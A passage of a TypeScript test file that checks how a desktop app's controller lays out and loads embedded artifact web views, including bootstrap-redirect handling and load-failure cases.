    expect(views[0]?.bounds).toHaveLength(laidOut);
  });

  it('refuses to lay out or present over a window that is gone', async () => {
    const { controller, views, host } = harness();
    await controller.present({ artifactId: ARTIFACT, url: `${ORIGIN}/`, bounds, cornerRadius: 16 });
    const laidOut = views[0]!.bounds.length;
    host.destroyed = true;
    controller.setBounds({ x: 100, y: 100, width: 200, height: 200 });
    controller.setOverlayOpen(true);
    expect(views[0]?.bounds).toHaveLength(laidOut);
    expect(await controller.present({ artifactId: 'other', url: `${ORIGIN}/`, bounds, cornerRadius: 16 })).toBe(false);
    expect(views).toHaveLength(1);
  });
});

describe('artifact initial loading', () => {
  it('distinguishes the bootstrap handoff from a terminal load failure', async () => {
    await expect(loadArtifactInitialUrl(async () => {
      throw Object.assign(new Error('aborted'), { code: 'ERR_ABORTED', errno: -3 });
    })).resolves.toBe(true);
    await expect(loadArtifactInitialUrl(async () => {
      throw Object.assign(new Error('dns'), { code: 'ERR_NAME_NOT_RESOLVED', errno: -105 });
    })).resolves.toBe(false);
  });
});

describe('loading an artifact’s own document', () => {
  /** Web contents that walk the redeem bootstrap the way Chromium does. */
  function contents(steps: (emitter: EventEmitter & { url: string }) => void) {
    const emitter = Object.assign(new EventEmitter(), { url: '' });
    const surface: ArtifactDocumentContents & { listenerCount(event: string): number } = {
      getURL: () => emitter.url,
      loadURL: async (url: string) => {
        emitter.url = url.split('#')[0]!;
        steps(emitter);
        throw Object.assign(new Error('aborted'), { code: 'ERR_ABORTED', errno: -3 });
      },
      on: (event: string, listener: (...args: never[]) => void) => emitter.on(event, listener as (...args: unknown[]) => void),
      removeListener: (event: string, listener: (...args: never[]) => void) => emitter.removeListener(event, listener as (...args: unknown[]) => void),
      listenerCount: (event: string) => emitter.listenerCount(event),
    };
    return surface;
  }

  it('resolves on the site’s document, not on the bootstrap before it', async () => {
    const order: string[] = [];
    const surface = contents((emitter) => {
      // Even were the bootstrap to reach `dom-ready`, it is not the site.
      emitter.emit('dom-ready');
      emitter.emit('did-fail-load', {}, -3, 'ERR_ABORTED', `${ORIGIN}/__rally/open`, true);
      setTimeout(() => {
        emitter.url = `${ORIGIN}/`;
        order.push('site');
        emitter.emit('dom-ready');
      }, 0);
    });
    await expect(loadArtifactDocument(surface, `${ORIGIN}/__rally/open#code`).then((shown) => {
      order.push('resolved');
      return shown;
    })).resolves.toBe(true);
    expect(order).toEqual(['site', 'resolved']);
    expect(surface.listenerCount('dom-ready')).toBe(0);
  });

  it('fails on a main-frame load failure after the bootstrap', async () => {
    const surface = contents((emitter) => {
      setTimeout(() => emitter.emit('did-fail-load', {}, -105, 'ERR_NAME_NOT_RESOLVED', `${ORIGIN}/`, true), 0);
    });
    await expect(loadArtifactDocument(surface, `${ORIGIN}/__rally/open#code`)).resolves.toBe(false);
  });

  it('fails when its contents go away before the site arrives', async () => {
    const surface = contents((emitter) => { setTimeout(() => emitter.emit('destroyed'), 0); });
    await expect(loadArtifactDocument(surface, `${ORIGIN}/__rally/open#code`)).resolves.toBe(false);
  });
});
